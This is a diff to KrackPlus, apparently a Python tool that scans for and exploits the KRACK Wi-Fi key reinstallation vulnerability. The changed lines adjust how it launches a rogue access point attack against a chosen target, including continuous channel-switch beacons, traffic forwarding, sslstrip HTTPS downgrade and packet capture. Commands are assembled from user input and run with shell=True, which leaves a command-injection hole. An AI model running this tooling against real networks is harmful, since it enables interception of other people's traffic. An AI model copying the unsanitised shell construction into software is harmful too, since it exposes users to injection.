@@ -41,7 +41,7 @@ log.debug("KrackPlus is a tool to scan for and exploit the KRACK vulnerability i
 log.debug("KrackPlus 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kristian Maehlum.\n")
 
 def main():
-    USAGE = "\nKrackPlus Scan:   ./krackPlus.py [-s]\n\t          ./krackPlus.py [-s] [--set-ssid SSID] [--set-password PASSWORD] [--path PATH]\nKrackPlus Attack: ./krackPlus.py [-a] [-m --nic-rogue-monitor NIC] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address] [--continuous-csa] [--group] [--pcap]"
+    USAGE = "\nKrackPlus Scan:   ./krackPlus.py [-s]\n\t          ./krackPlus.py [-s] [--set-ssid SSID] [--set-password PASSWORD] [--path PATH]\nKrackPlus Attack: ./krackPlus.py [-a] [-m --nic-rogue-monitor NIC] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address] [--continuous-csa] [--group] [--pcap FILENAME]"
 
     parser = optparse.OptionParser(usage=USAGE)
 
@@ -71,7 +71,7 @@ def main():
     parser.add_option("-m", "--nic-rogue-monitor", help="Wireless NIC that will listen on the channel of the rogue AP.", dest='monRogue')
     parser.add_option('--pcap', help="Save packet capture to file as a pcap. Provide a filename; $NIC.pcap will be appended to the name. Not compatible with --dd", dest='pcap')
     parser.add_option('--sslstrip', help="Use this option to enable sslstrip in an attempt to downgrade HTTPS to HTTP.", action='store_true')
-    parser.add_option("-c", "--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second) in order to push the target to the channel of the rogue AP", dest="csa", action='store_true')
+    parser.add_option("-c", "--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second) in order to push the target to the channel of the rogue AP", dest='csa', action='store_true')
     
     # General KRACK+ options:
     parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
@@ -165,7 +165,7 @@ def main():
 		                                 options.mon + " " + options.targetSSID + " --target " + options.target + " --debug &"], stdout=attackOutput, shell=True)
 		        
                 # Saves pcap from attack to file and moves it to the reports folder 
-                elif options.pcap:	 
+                elif options.pcap and not options.csa:	 
                     subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                          options.mon + " " + options.targetSSID + " --target " + options.target + " --dump " + options.pcap + " &"], stdout=attackOutput, shell=True)
                 
@@ -188,13 +188,16 @@ def main():
                     subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py -m" + options.monRogue + " " + options.rogue + " " +
                                          options.mon + " " + options.targetSSID + " --target " + options.target + "- " + options.group + " &"], stdout=attackOutput, shell=True) 
                
-                # Starts attack and sends CSA beacons every 10 seconds
-                elif options.csa:
-                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+                # Starts attack and sends CSA beacons every 10 seconds and also use one interface to monitor the rogue channel.
+                elif options.csa and options.monRogue:
+                    log.info("Performing Key reinstallation attacks with continuous CSA and listening on the rogue AP channel")
+                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py -m" + options.monRogue + options.rogue + " " +
                                          options.mon + " " + options.targetSSID + " --target " + options.target + " --continuous-csa" + " &"], stdout=attackOutput, shell=True)
 
-                elif options.csa and options.monRogue:
-                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py -m" + options.monRogue + options.rogue + " " +
+                # Starts attack and sends CSA beacons every 10 seconds
+                elif options.csa and not (options.monRogue or options.pcap):
+                    log.info("Performing Key reinstallation attacks with continuous CSA")
+                    subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
                                          options.mon + " " + options.targetSSID + " --target " + options.target + " --continuous-csa" + " &"], stdout=attackOutput, shell=True)
 
                 # Launches the 'standard' attack, without pcap or debug enabled. 
@@ -205,7 +208,7 @@ def main():
                 # Forward traffic        
                 subprocess.Popen(["cd krackattacks-poc-zerokey/krackattack/ && bash enable_internet_forwarding.sh > /dev/null &"], shell=True)
                 # Start dnsmasq #TODO implement or remove
-                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && dnsmasq -d -C dnsmasq.conf --quiet-dhcp --quiet-dhcp6 --quiet-ra > /dev/null &"], shell=True)
+                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && dnsmasq -d -C dnsmasq.conf  > /dev/null &"], shell=True)
 
                         
                 log.info("Open Wireshark to see traffic")
@@ -230,7 +233,8 @@ def main():
                 subprocess.call(["./killProcesses.sh sslstrip"], shell=True)
             # move packet captures to the correct folder
             if options.pcap:
-                subprocess.call(["cd " + "krackattacks-poc-zerokey/krackattack/ && mv *.pcap ../../reports/"], shell=True)
+                log.info("Moving packet capture file to reports/")
+                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && mv *.pcap ../../reports/"], shell=True)
 
         # Catches general errors. 
         except:
@@ -241,13 +245,14 @@ def main():
             # kills dnsmasq and sslstrip (if user used the sslstrip option)
             subprocess.call(["./killProcesses.sh dnsmasq"], shell=True)
             # stop forwarding traffic
-            subprocess.call(["sysctl net.ipv4.ip_forward=0"], shell=True) 
+            subprocess.call(["sysctl net.ipv4.ip_forward=0 > /dev/null"], shell=True) 
             # kills sslstrip provided that the user chose to enable it 
             if options.sslstrip:
                 subprocess.call(["./killProcesses.sh sslstrip"], shell=True)
             # move packet captures to the correct folder
             if options.pcap:
-                subprocess.call(["cd " + "krackattacks-poc-zerokey/krackattack/ && mv *.pcap ../../reports/"], shell=True)
+                log.info("Moving packet capture file to reports/")
+                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && mv *.pcap ../../reports/"], shell=True)
 
 
     ############# RESTORE INTERNET ################        
